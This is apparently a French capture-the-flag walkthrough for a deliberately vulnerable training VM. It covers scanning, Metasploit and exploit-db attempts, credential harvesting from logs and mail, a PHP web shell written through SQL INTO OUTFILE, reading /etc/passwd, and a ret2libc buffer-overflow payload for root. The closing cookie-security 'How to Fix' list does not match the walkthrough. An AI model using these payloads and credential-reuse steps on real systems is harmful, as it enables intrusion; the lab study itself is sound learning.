#### I - Trouver l'ip de la machine
``nmap -sn 192.168.31.0/24``
>Nmap scan report for BornToSecHackMe (**192.168.31.26**)

----

#### II - On verifie les services ouverts sur tous les ports
``nmap -p- -sV 192.168.31.26``
>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 20:55 CEST
>Nmap scan report for BornToSecHackMe (192.168.31.26)
>Host is up (0.000079s latency).
>Not shown: 65529 closed tcp ports (conn-refused)
>PORT		STATE	SERVICE    VERSION
>**21/tcp	open	ftp        vsftpd 2.0.8 or later
>22/tcp		open	ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
>80/tcp		open	http       Apache httpd 2.2.22 ((Ubuntu))
>143/tcp		open	imap       Dovecot imapd
>443/tcp		open	ssl/http   Apache httpd 2.2.22
>993/tcp		open	ssl/imaps?
>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel**

----

#### III - On etudie les failles connues sur les services
**SSH :**
CVE-2016-0777 : Permet à un serveur malveillant d'exfiltrer des données privées du client en envoyant un paquet SSH2_MSG_UNIMPLEMENTED en réponse à une requête SSH_FXP_INIT.

**Apache httpd 2.2.22 :**
CVE-2017-7679: Une vulnérabilité dans le module mod_mime peut permettre à un attaquant d'exécuter du code arbitraire à distance.
[-] https://192.168.31.26:443
-> The target is not vulnerable to CVE-2021-42013 (requires mod_cgi to be enabled).

**VSFTPD :**
backdoor dans la version 2.3.4
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 192.168.1.2
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 192.168.31.26:21 - Banner: 220 Welcome on this server
[*] 192.168.31.26:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.

----

#### III - On etudie l'arborescence du site

Avec ``dirb``, sur le https, on trouve ceci d'interessant :

##### /forum
- type : my little forum
- On fouille le forum et on trouve un post :
>Probleme login ?

A l'interieur on etudie les logs et on se rend compte que l'utilisateur a du tenter de mettre son mot de passe a la place du login ici :
>Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user **!q\]Ej?*5K5cy*AJ** from 161.202.39.38 port 57764 ssh2

On connait deja son login grace a plusieurs lignes dont celle-ci :

>Oct 5 09:21:01 BornToSecHackMe CRON[9111]: pam_unix(cron:session): session closed for user **lmezard**

- On teste sur le forum, **lmezard / !q\]Ej?*5K5cy*AJ** -> Ca fonctionne.
- On trouve son adresse mail sur son profil **laurie@borntosec.net**

##### /webmail
- SquirrelMail version 1.4.22
- Avec les infos collectees sur le forum on se connecte laurie@borntosec.net / !q\]Ej?*5K5cy*AJ
- On trouve un mail -> You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
**On va pouvoir probablement se connecter a phpmyadmin**
- Faille connue : SquirrelMail <= 1.4.23 Remote Code Execution PoC Exploit (CVE-2017-7692)
``bash /usr/share/exploitdb/exploits/linux/remote/41910.sh https://192.168.31.26/webmail``
-> Ne semble pas fonctionner

##### /phpmyadmin
- Le combo **root / Fg-'kKXBj87E:aJ$** fonctionne

- Dans forum_db, mlf2_settings on obtient la **version de my little forum : 2.3.4**

- Dans forum_db / mlt2_userdata, on a acces aux mots de passe cryptes de tout le monde **-> A VOIR ? ESSAYER DE DECRYPTER EN CHERCHANT DES INFOS SUR LA METHODE DE CRYPTAGE EMPLOYEE PAR CETTE VERSION DE MY LITTLE FORUM**
- En passant lmezard en type 2, il devient admin **-> UTILE ?**
- Dans mysql il y a une table user, avec root / debian-sys-maint avec les mdps en sha1 :
>root / 8A074E30DC25CE94B17C9858F794303F71E3BCC7

-> Il doit probablement correspondre a Fg-'kKXBj87E:aJ$

>debian-sys-maint / 52B24D4192EDDFB439C67E1F92421C4D2D4F5598

- On tente de decrypter les mots de passe, sans succes.

- On va **creer un reverseShell** assez simple en injectant :
``SELECT "<HTML><BODY><FORM METHOD='GET' NAME='myform' ACTION=''><INPUT TYPE='text' NAME='cmd'><INPUT TYPE='submit' VALUE='Send'></FORM><pre><?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?> </pre></BODY></HTML>" INTO OUTFILE '/var/www/forum/templates_c/cmd.php'``
- On peut maintenant y acceder ici : https://192.168.31.26/forum/templates_c/cmd.php

----

#### IV - Exploitons le reverse shell

##### Listons les utilisateurs
``cat /etc/passwd`` (voir resulat complet dans le fichier /ressources/users)
Voici les resultats qui semblent interessants :
>root: x:0:0:root:/root:/bin/bash
www-data: x:33:33:www-data:/var/www:/bin/sh
ft_root: x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
lmezard: x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
laurie@borntosec.net: x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
laurie: x:1003:1003:,,,:/home/laurie:/bin/bash
thor: x:1004:1004:,,,:/home/thor:/bin/bash
zaz: x:1005:1005:,,,:/home/zaz:/bin/bash

On s'interesse a ceux disposant d'un dossier ``home`` avec la commande ``ls -la /home``
>drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
drwxr-x--- 4 laurie@borntosec.net laurie@borntosec.net 113 Oct 15  2015 laurie@borntosec.net
dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz

Hummm... LOOKATME ? Il se situe chez www-data, ca tombe bien, c'est notre user actuel, donc jettons un oeil :
``ls -la /home/LOOKATME``
>-rwxr-x--- 1 www-data www-data  25 Oct  8  2015 password

``cat /home/LOOKATME/password``
>lmezard:G!@M6f4Eatau{sF"

On teste en SSH, ca ne fonctionne pas.
Comme nous connaissons deja son mot de passe forum et webmail, il nous reste a essayer en ftp -> ca fonctionne !

----

#### V - Le FTP
Telechargeons le fichier README et lisons le :
>Complete this little challenge and use the result as password for user 'laurie' to login in ssh

Telechargeons le fichier fun
On decompresse l'archive ``tar xvf fun``
On se retrouve avec un dossier contenant 750 fichiers **pcap**
Ce ne sont pas reellement des fichiers pcap :
``cat 00M73.pcap ``
>void useless() {
>
>//file12%

Les fichiers semblent numerotes en commentaire.
On va essayer de les fusionner dans l'ordre indique des commentaires, on va utiliser le script shell fusion-pcap.sh.
On nettoie les donnees inutiles du fichier, on compile et on execute le code, ce qui donne :
>MY PASSWORD IS: Iheartpwnage
>Now SHA-256 it and submit

Une fois crypte en sha256 on obtient :
>330B845F32185747E4F8CA15D40CA59796035C89EA809FB5D30F4DA83ECF45A4

----

#### VI - Laurie SSH
On teste de se connecter en SSH, ca ne fonctionne pas, on teste en lowercase :
>330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

Ca fonctionne, nous voila log en tant que laurie, en ssh sur le serveur !

On jette un oeil au contenu du dossier
``ls -l``
>-rwxr-x--- 1 laurie laurie 26943 Oct  8  2015 bomb
>-rwxr-x--- 1 laurie laurie   158 Oct  8  2015 README

On lit le README
``cat README ``
>Diffuse this bomb!
>When you have all the password use it as "thor" user with ssh.
>
>HINT:
>P
> 2
> b
>
>o
>4
>
>NO SPACE IN THE PASSWORD (password is case sensitive).

Un nouveau challenge...
On va analyser la bomb, on commence par la telecharger :
``scp laurie@192.168.21.205:/home/laurie/bomb ~/Desktop/``

Ensuite on l'etudie en decompilant le tout avec ghidra :
- Le premier niveau est simple, on voit que phase1 se contente de compare l'entree utilisateur avec la string ``Public speaking is very easy.``
>Phase 1 defused. How about the next one?
- En etudiant la phase2, on comprend que le premier chiffre doit etre 1 et que pour la suite chaque nombre doit etre egal au precedent * la position (index + 1) du nombre actuel, on obtient :
``1 2 6 24 120 720``
>That's number 2.  Keep going!
- Pour la phase3, il nous faut 3 arguments. Le premier est un nombre situe entre 0 et 7, peu importe. Le deuxieme argument est lie au choix du premier argument, et le dernier argument doit etre la correspondance decimale defini pour chaque lettre, voila donc les combinaisons possibles :
``0 q 777, 1 b 214, 2 b 755, 3 k 251, 4 o 160, 5 t 458, 6 v 780, 7 b 524``
L'indice etant ``b`` on va donc choisir ``1 b 214``.
>Halfway there!
- Pour la phase4 on comprend que :
	- ce doit etre un nombre superieur a 0
	- quand on le passe la fonction func4 il doit donner 55
	- en analysant func4 on comprends qu'il s'agit d'une suite de fibonacci recursive qui commence par 2 fois le chiffre 1. Dans une suite normale (commencant par 0 puis 1) le nombre 55 est obtenu a la dixieme position. Comme nous partons directement a la deuxieme position (1 puis 1), le chiffre attendu est donc 9.
``9``
>So you got that one.  Try this one.
- Pour la phase 5, il faut que l'on commence par trouver la valeur de array.123, en cherchant avec ghidra on trouve ``isrveawhobpnutfg``.
Ensuite, chaque caractère de la chaîne d'entrée est converti en un byte, puis il est appliqué un opérateur ET binaire avec 0xf (ou 15 en décimal), ce qui a pour effet de ne conserver que les 4 derniers bits du byte (c'est-à-dire, le reste de la division du byte par 16).
L'opération précédente donne un index dans array.123. Le caractère à cet index de array.123 est ajouté à une nouvelle chaîne local_c.
La chaine local_c est ensuite comparee a l'input et doit correspondre.
"g" est à l'indice 15 dans array.123, le caractere dont les 4 derniers bits correspondent à 15 -> "o" (0x6F).
"i" est à l'indice 0 dans array.123, le caractere dont les 4 derniers bits correspondent à 0 -> "p" (0x70).
"a" est à l'indice 6 dans array.123, le caractere dont les 4 derniers bits correspondent à 6 -> "e" (0x75).
"n" est à l'indice 11 dans array.123, le caractere dont les 4 derniers bits correspondent à 11 -> "k" (0x6B).
"t" est à l'indice 13 dans array.123, le caractere dont les 4 derniers bits correspondent à 13 -> "m" (0x6D).
"s" est à l'indice 1 dans array.123, le caractere dont les 4 derniers bits correspondent à 1 -> "q" (0x71).
``opekmq``
>Good work!  On to the next...
- Pour la phase6, on comprend qu'il y a des noeuds, numerotes de 1 a 6, qu'il faut trier. On sait grace a l'indice que le premier noeud est le numero 4. Je n'arrive pas a trouver de methode pour lire la valeur des noeuds en memoire, alors je vais le tenter en bruteforce a l'aide d'un script python maison (scripts/phase6.c)
>Combinaison correcte trouvée: 4 2 6 3 1 5

On essaie la connexion ssh avec thor / Publicspeakingisveryeasy.126241207201b2149opekmq426315
-> Ca ne fonctionne pas !

En relisant le sujet (et aussi apres beaucoup de recherches notamment sur slack), on se rend compte de la consigne :
>For the part related to a (bin) bomb: If the password found is
>123456. The password to use is 123546.

On inverse donc le 3 et le 1 ce qui donne :
``Publicspeakingisveryeasy.126241207201b2149opekmq426135``
Et ca fonctionne !

##### VII - Thor SSH
``cat README``
Finish this challenge and use the result as password for 'zaz' user.

``cat turtle ``
>[...]
>Avance 1 spaces
>Tourne droite de 1 degrees
>Avance 1 spaces
>Tourne droite de 1 degrees
>Avance 1 spaces
>Tourne droite de 1 degrees
>Avance 50 spaces
>
>Avance 100 spaces
>Recule 200 spaces
>Avance 100 spaces
>Tourne droite de 90 degrees
>Avance 100 spaces
>Tourne droite de 90 degrees
>Avance 100 spaces
>Recule 200 spaces
>
>Can you digest the message? :)

On va telecharger le fichier :
``scp thor@192.168.21.205:/home/thor/turtle ~/Desktop/``

Turtle fait reference a un module graphique du langage de programmation Python. Il est inspiré de la programmation Logo et permet de déplacer une tortue sur l’écran. On va donc creer un script (scripts/turtle.py) et l'executer.
On voit la tortue dessiner les lettres **SLASH**.
Apres plusieurs tests (majuscule, minuscule, SHA1, SHA256) on finit par trouver la forme attendue, il s'agit d'un simple hash MD5 :
``646da671ca01bb5d84dbb5fb2238dc8e``

##### VII - Zaz SSH

En analysant l'executable avec ghidra, on se rend compte que la fonction main utilise strcpy, sur une destination de 140, sans verifier la taille de la source.
On va donc effectuer un debordement de tampon, et faire executer un shell root par le programme.

``gdb exploit_me``
>(gdb) disas main
Dump of assembler code for function main:
   0x080483f4 <+0>:	push   %ebp
   0x080483f5 <+1>:	mov    %esp,%ebp
   0x080483f7 <+3>:	and    $0xfffffff0,%esp
   0x080483fa <+6>:	sub    $0x90,%esp
   0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
   0x08048404 <+16>:	jg     0x804840d <main+25>
   0x08048406 <+18>:	mov    $0x1,%eax
   0x0804840b <+23>:	jmp    0x8048436 <main+66>
   0x0804840d <+25>:	mov    0xc(%ebp),%eax
   0x08048410 <+28>:	add    $0x4,%eax
   0x08048413 <+31>:	mov    (%eax),%eax
   0x08048415 <+33>:	mov    %eax,0x4(%esp)
   0x08048419 <+37>:	lea    0x10(%esp),%eax
   0x0804841d <+41>:	mov    %eax,(%esp)
   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    0x10(%esp),%eax
   0x08048429 <+53>:	mov    %eax,(%esp)
   0x0804842c <+56>:	call   0x8048310 <puts@plt>
   0x08048431 <+61>:	mov    $0x0,%eax
   0x08048436 <+66>:	leave
   0x08048437 <+67>:	ret
End of assembler dump.

- On set un breakpoint a la fin du main
``(gdb) break *0x08048437``
>Breakpoint 1 at 0x8048437

- On envoi 140 caracteres a au programme pour remplir le tampon
``(gdb) run $(python -c 'print "a"*140')``
>Starting program: /home/zaz/exploit_me $(python -c 'print "a"*140')
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Breakpoint 1, 0x08048437 in main ()

- On recupere l'adresse de la commande system
``(gdb) p system``
>$1 = {<text variable, no debug info>} 0xb7e6b060 <system>

- On recupere l'adresse de l'argument /bin/sh
``(gdb) find __libc_start_main,+99999999,"/bin/sh"``
>0xb7f8cc58
1 pattern found.

- On effectue le debordement de tampon, en entrant remplissant les 140 premiers caracteres avec du garbage, puis l'adresse de system, puis du garbage (pour remplir l'argument de system), puis on donne l'argument.
./exploit_me `python -c "print('a' * 140 + '\x60\xb0\xe6\xb7' + '0000' + '\x58\xcc\xf8\xb7')"`

#-> **ROOOOOOT**## How to Fix
- Encryption with private key rather than simple hashing
- Backend validation of the cookie's validity and identity
- Use of Secure and HttpOnly Flags, for cookie transmission via HTTPS only
- Limiting cookies in time
